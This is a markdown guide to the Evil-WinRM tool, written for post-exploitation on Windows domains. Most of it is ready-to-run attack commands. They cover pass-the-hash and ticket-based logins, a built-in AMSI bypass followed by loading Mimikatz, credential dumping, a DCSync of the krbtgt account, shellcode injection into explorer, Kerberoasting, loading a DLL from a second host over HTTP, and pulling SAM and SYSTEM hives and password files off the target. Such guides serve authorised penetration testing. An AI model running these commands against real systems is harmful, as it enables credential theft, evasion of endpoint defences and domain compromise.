# Evil-WinRM Features Guide

Comprehensive guide to Evil-WinRM features for post-exploitation on Windows systems.

## Table of Contents

- [Authentication Methods](#authentication-methods)
- [File Transfer Commands](#file-transfer-commands)
- [PowerShell Script Loading](#powershell-script-loading)
- [DLL Loading for Bypass](#dll-loading-for-bypass)
- [Binary Execution](#binary-execution)
- [SSL/TLS Options](#ssltls-options)
- [Logging Capabilities](#logging-capabilities)
- [Menu Commands Reference](#menu-commands-reference)
- [Practical Examples](#practical-examples)

---

## Authentication Methods

### Password Authentication

Standard username/password authentication over WinRM.

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'P@ssw0rd!'

# Prompt for password (avoid shell history)
evil-winrm -i 192.168.1.100 -u Administrator
```

### Pass-the-Hash (PTH)

Authenticate using NTLM hash without knowing the plaintext password. Essential for lateral movement after extracting hashes.

```bash
# Full NTLM hash (LM:NT format)
evil-winrm -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# NT hash only (LM part is empty/default)
evil-winrm -i 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

**Hash Sources:**
- Mimikatz `sekurlsa::logonpasswords`
- secretsdump.py from domain controller
- SAM database extraction
- LSASS memory dumps

### Kerberos Authentication

Authenticate using Kerberos tickets (TGT/TGS). Useful for pass-the-ticket attacks and avoiding NTLM-based detections.

**Requirements:**
1. Valid Kerberos configuration in `/etc/krb5.conf`
2. Time synchronization with domain controller
3. DNS resolution or `/etc/hosts` entries

**Configuration (`/etc/krb5.conf`):**
```ini
[libdefaults]
    default_realm = CONTOSO.COM
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    CONTOSO.COM = {
        kdc = dc01.contoso.com
        admin_server = dc01.contoso.com
    }

[domain_realm]
    .contoso.com = CONTOSO.COM
    contoso.com = CONTOSO.COM
```

```bash
# Using ccache file (from Rubeus, impacket, etc.)
export KRB5CCNAME=/tmp/administrator.ccache
evil-winrm -i dc01.contoso.com -r CONTOSO.COM

# Explicit ccache path
evil-winrm -i dc01.contoso.com -r CONTOSO.COM -K /tmp/administrator.ccache

# Using kirbi file (from Mimikatz/Rubeus)
evil-winrm -i dc01.contoso.com -r CONTOSO.COM -K /tmp/ticket.kirbi
```

**Time Sync (Critical):**
```bash
# Check time difference
ntpdate -q dc01.contoso.com

# Sync time with DC
sudo ntpdate dc01.contoso.com
```

---

## File Transfer Commands

Evil-WinRM provides built-in file transfer without requiring external tools.

### Upload Files

Transfer files from attacker machine to target.

```powershell
# Basic upload
*Evil-WinRM* PS C:\> upload /opt/tools/SharpHound.exe

# Upload to specific path
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe C:\Windows\Temp\m.exe

# Upload with spaces in path
*Evil-WinRM* PS C:\> upload "/path/with spaces/file.exe" "C:\Program Files\target.exe"
```

### Download Files

Transfer files from target to attacker machine.

```powershell
# Download to current directory
*Evil-WinRM* PS C:\> download C:\Users\Admin\Desktop\secrets.txt

# Download to specific local path
*Evil-WinRM* PS C:\> download C:\Windows\NTDS\ntds.dit /tmp/ntds.dit

# Download with wildcard (downloads first match)
*Evil-WinRM* PS C:\Users\Admin\> download Desktop\*.kdbx
```

### Transfer Considerations

- **Progress indicator** - Shows transfer progress for large files
- **Binary safe** - Handles executables and binary data correctly
- **Path completion** - Tab completion for remote paths (when enabled)
- **Size limits** - Large files may timeout; consider compression

---

## PowerShell Script Loading

Load PowerShell scripts into memory for fileless execution.

### Setup

```bash
# Specify scripts directory at startup
evil-winrm -i 192.168.1.100 -u Admin -p Pass -s /opt/ps-scripts/

# Multiple uses
evil-winrm -i 192.168.1.100 -u Admin -p Pass -s /opt/powershell/ -e /opt/binaries/
```

### Loading Scripts

Scripts from the `-s` directory are loaded by typing their filename.

```powershell
# List available scripts
*Evil-WinRM* PS C:\> menu

# Load PowerView
*Evil-WinRM* PS C:\> PowerView.ps1
[+] PowerView.ps1 loaded

# Now use PowerView functions
*Evil-WinRM* PS C:\> Get-DomainUser -Identity administrator
*Evil-WinRM* PS C:\> Find-LocalAdminAccess
*Evil-WinRM* PS C:\> Get-DomainComputer -Unconstrained
```

### Common Scripts to Load

| Script | Purpose |
|--------|---------|
| `PowerView.ps1` | AD enumeration and exploitation |
| `Invoke-Mimikatz.ps1` | In-memory credential extraction |
| `PowerUp.ps1` | Windows privilege escalation checks |
| `Invoke-Kerberoast.ps1` | Kerberoasting attacks |
| `Invoke-BloodHound.ps1` | AD relationship mapping |
| `Invoke-Portscan.ps1` | Network scanning |
| `Invoke-ShareFinder.ps1` | SMB share enumeration |
| `Invoke-UserHunter.ps1` | Find logged-in users |

### Script Loading Workflow

```powershell
# 1. Load enumeration script
*Evil-WinRM* PS C:\> PowerView.ps1

# 2. Bypass AMSI if needed
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Run enumeration
*Evil-WinRM* PS C:\> Get-DomainController
*Evil-WinRM* PS C:\> Get-DomainPolicy
*Evil-WinRM* PS C:\> Get-DomainTrust
```

---

## DLL Loading for Bypass

Load custom DLLs for AMSI bypass and other evasion techniques.

### Built-in AMSI Bypass

Evil-WinRM includes a dynamic AMSI bypass:

```powershell
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success! Patched AMSI context in memory
```

### Custom DLL Loading

Use `Dll-Loader` for custom bypass DLLs or additional functionality.

```powershell
# Load DLL from HTTP
*Evil-WinRM* PS C:\> Dll-Loader -http -path http://192.168.1.50/bypass.dll

# Load DLL from SMB share
*Evil-WinRM* PS C:\> Dll-Loader -smb -path \\192.168.1.50\share\custom.dll

# Load from local path (on target)
*Evil-WinRM* PS C:\> Dll-Loader -local -path C:\Windows\Temp\loader.dll
```

### DLL Loading Protocols

| Protocol | Flag | Use Case |
|----------|------|----------|
| HTTP/S | `-http` | Download from web server |
| SMB | `-smb` | Load from file share |
| Local | `-local` | Load from target disk |

### AMSI Bypass Workflow

```powershell
# Step 1: Test if AMSI is blocking
*Evil-WinRM* PS C:\> "amsiutils"
# If blocked, you'll see an error

# Step 2: Apply bypass
*Evil-WinRM* PS C:\> Bypass-4MSI

# Step 3: Verify bypass
*Evil-WinRM* PS C:\> "amsiutils"  # Should work now

# Step 4: Load malicious scripts
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
*Evil-WinRM* PS C:\> Invoke-Mimikatz -DumpCreds
```

---

## Binary Execution

Execute C# assemblies and shellcode in memory.

### Invoke-Binary

Execute .NET assemblies without dropping to disk.

```bash
# Start with executables path
evil-winrm -i 192.168.1.100 -u Admin -p Pass -e /opt/sharp-tools/
```

```powershell
# Execute Rubeus
*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe kerberoast /outfile:hashes.txt

# Execute Seatbelt
*Evil-WinRM* PS C:\> Invoke-Binary Seatbelt.exe -group=all

# Execute SharpHound
*Evil-WinRM* PS C:\> Invoke-Binary SharpHound.exe -c all -d contoso.com
```

### Donut-Loader

Execute shellcode generated by Donut framework.

```powershell
# Load x64 shellcode
*Evil-WinRM* PS C:\> Donut-Loader -process_id 1234 -donutfile /path/to/payload.bin

# Inject into specific process
*Evil-WinRM* PS C:\> Donut-Loader -process_id (Get-Process explorer).Id -donutfile payload.bin
```

### Common Binaries

| Binary | Purpose |
|--------|---------|
| `Rubeus.exe` | Kerberos attacks |
| `Seatbelt.exe` | Security enumeration |
| `SharpHound.exe` | BloodHound collection |
| `Certify.exe` | AD CS enumeration |
| `SharpUp.exe` | Privilege escalation |
| `SharpDPAPI.exe` | DPAPI extraction |

---

## SSL/TLS Options

Connect to WinRM over HTTPS (port 5986).

### Basic SSL Connection

```bash
# Enable SSL
evil-winrm -i 192.168.1.100 -u Admin -p Pass -S -P 5986

# With certificate validation disabled (self-signed certs)
evil-winrm -i 192.168.1.100 -u Admin -p Pass -S -P 5986
```

### Client Certificate Authentication

```bash
# Using client certificates
evil-winrm -i 192.168.1.100 -S -P 5986 -c /path/to/cert.pem -k /path/to/key.pem

# Full authentication with certs
evil-winrm -i 192.168.1.100 -u Admin -p Pass -S -P 5986 -c client.pem -k client-key.pem
```

### SSL Options Reference

| Option | Description |
|--------|-------------|
| `-S, --ssl` | Enable SSL/TLS connection |
| `-P, --port` | Port (5986 for HTTPS) |
| `-c, --pub-key` | Client public key certificate |
| `-k, --priv-key` | Client private key |

---

## Logging Capabilities

Record session activity for documentation and review.

### Enable Logging

```bash
# Enable logging at startup
evil-winrm -i 192.168.1.100 -u Admin -p Pass -l
```

### Log File Location

Logs are saved to:
```
~/.evil-winrm/logs/<IP>_<USER>_<TIMESTAMP>.log
```

### Log Contents

- All commands executed
- Command output
- File transfers
- Timestamps
- Session metadata

### Logging Best Practices

1. **Always enable for engagements** - Required for reporting
2. **Review before exiting** - Ensure captures are complete
3. **Secure log storage** - Contains sensitive data
4. **Use with screenshots** - Supplement with visual evidence

---

## Menu Commands Reference

Access all available commands via the `menu` command.

```powershell
*Evil-WinRM* PS C:\> menu
```

### Core Commands

| Command | Description |
|---------|-------------|
| `upload <local> [remote]` | Upload file to target |
| `download <remote> [local]` | Download file from target |
| `menu` | Show available commands |
| `exit` | Close session |

### Script/Binary Commands

| Command | Description |
|---------|-------------|
| `<script>.ps1` | Load PowerShell script from -s path |
| `Invoke-Binary <exe> [args]` | Execute .NET assembly in memory |
| `Dll-Loader` | Load DLL into memory |
| `Donut-Loader` | Execute Donut shellcode |

### Evasion Commands

| Command | Description |
|---------|-------------|
| `Bypass-4MSI` | Patch AMSI in memory |

### Enumeration Commands

| Command | Description |
|---------|-------------|
| `services` | List Windows services |

### Session Commands

| Command | Description |
|---------|-------------|
| `history` | Show command history |

---

## Practical Examples

### Example 1: Initial Access and Enumeration

```bash
# Connect with credentials
evil-winrm -i 192.168.1.100 -u svc_backup -p 'B4ckup2024!' -s /opt/powershell/
```

```powershell
# Check current context
*Evil-WinRM* PS C:\> whoami /all
*Evil-WinRM* PS C:\> hostname

# Load PowerView for AD enum
*Evil-WinRM* PS C:\> PowerView.ps1

# Enumerate domain
*Evil-WinRM* PS C:\> Get-Domain
*Evil-WinRM* PS C:\> Get-DomainController
*Evil-WinRM* PS C:\> Get-DomainUser -SPN  # Kerberoastable accounts
```

### Example 2: Pass-the-Hash Lateral Movement

```bash
# After obtaining hash from first target
evil-winrm -i 192.168.1.50 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

```powershell
# Verify access
*Evil-WinRM* PS C:\> whoami
WORKGROUP\administrator

# Extract more credentials
*Evil-WinRM* PS C:\> Bypass-4MSI
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Example 3: Kerberos-Based Access

```bash
# Set up Kerberos environment
export KRB5CCNAME=/tmp/admin.ccache

# Verify ticket
klist

# Connect using ticket
evil-winrm -i dc01.corp.local -r CORP.LOCAL
```

```powershell
# Now operating as ticket owner
*Evil-WinRM* PS C:\> whoami
CORP\administrator

# DCSync using domain admin context
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:krbtgt"'
```

### Example 4: AMSI Bypass and Script Loading

```bash
evil-winrm -i 192.168.1.100 -u User -p Pass -s /opt/obfuscated-scripts/
```

```powershell
# Defender will likely block direct execution
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
# Error: This script contains malicious content...

# Apply AMSI bypass first
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!

# Now load the script
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
[+] Loaded successfully

# Execute
*Evil-WinRM* PS C:\> Invoke-Mimikatz -DumpCreds
```

### Example 5: File Exfiltration

```powershell
# Find interesting files
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users -Recurse -Include *.kdbx,*.key,*password*,*.config -ErrorAction SilentlyContinue

# Download discovered files
*Evil-WinRM* PS C:\> download C:\Users\admin\Documents\passwords.kdbx
*Evil-WinRM* PS C:\> download C:\inetpub\wwwroot\web.config

# Download registry hives (requires admin)
*Evil-WinRM* PS C:\> reg save HKLM\SAM C:\Windows\Temp\sam.bak
*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
*Evil-WinRM* PS C:\> download C:\Windows\Temp\sam.bak
*Evil-WinRM* PS C:\> download C:\Windows\Temp\system.bak
```

### Example 6: Binary Execution for Collection

```bash
evil-winrm -i 192.168.1.100 -u Admin -p Pass -e /opt/sharp-tools/
```

```powershell
# Run Seatbelt for enumeration
*Evil-WinRM* PS C:\> Invoke-Binary Seatbelt.exe -group=all -full

# Collect BloodHound data
*Evil-WinRM* PS C:\> Invoke-Binary SharpHound.exe --CollectionMethods All --Domain corp.local

# Download the ZIP
*Evil-WinRM* PS C:\> download C:\Users\Admin\*_BloodHound.zip

# Kerberoast with Rubeus
*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe kerberoast /outfile:C:\Windows\Temp\kerberoast.txt
*Evil-WinRM* PS C:\> download C:\Windows\Temp\kerberoast.txt
```

### Example 7: SSL Connection to Hardened Target

```bash
# Target only accepts HTTPS WinRM
evil-winrm -i secure.corp.local -u admin -p 'Secure123!' -S -P 5986

# With client certificate (if required)
evil-winrm -i secure.corp.local -S -P 5986 -c admin.pem -k admin-key.pem
```

### Example 8: Complete Post-Exploitation Workflow

```bash
# Initial access with full options
evil-winrm -i 192.168.1.100 -u compromised -p 'Password1' \
    -s /opt/powershell/ \
    -e /opt/binaries/ \
    -l
```

```powershell
# 1. Situational awareness
*Evil-WinRM* PS C:\> whoami /priv
*Evil-WinRM* PS C:\> net user compromised
*Evil-WinRM* PS C:\> net localgroup administrators

# 2. AMSI bypass for subsequent actions
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Privilege escalation check
*Evil-WinRM* PS C:\> PowerUp.ps1
*Evil-WinRM* PS C:\> Invoke-AllChecks

# 4. Credential access (if admin)
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
*Evil-WinRM* PS C:\> Invoke-Mimikatz -DumpCreds

# 5. Domain enumeration
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> Get-DomainUser -AdminCount
*Evil-WinRM* PS C:\> Find-LocalAdminAccess

# 6. Data collection
*Evil-WinRM* PS C:\> Invoke-Binary SharpHound.exe -c All
*Evil-WinRM* PS C:\> download *_BloodHound.zip

# 7. Clean up
*Evil-WinRM* PS C:\> Remove-Item *.zip -Force
*Evil-WinRM* PS C:\> exit
```

---

## Troubleshooting

### Common Issues

**"WinRM connection failed"**
- Verify port 5985 (HTTP) or 5986 (HTTPS) is open
- Check if WinRM service is running on target
- Verify credentials are correct

**"Kerberos authentication failed"**
- Check `/etc/krb5.conf` configuration
- Verify time sync with domain controller
- Ensure DNS resolves hostname correctly
- Verify ticket is valid: `klist`

**"Script load fails"**
- Check script path spelling
- Ensure script is in the `-s` directory
- Try `Bypass-4MSI` first if AMSI is blocking

**"Upload/download fails"**
- Check path permissions
- Verify disk space
- For large files, check timeout settings

### Debug Mode

```bash
# Increase verbosity for troubleshooting
evil-winrm -i target -u user -p pass --debug
```

---

## See Also

- [README.md](README.md) - Main documentation
- [Kerberos Authentication](kerberos-authentication.md) - Detailed Kerberos setup
- [Advanced Commands](advanced-commands.md) - In-depth command reference
- [Troubleshooting](troubleshooting.md) - Common issues and solutions
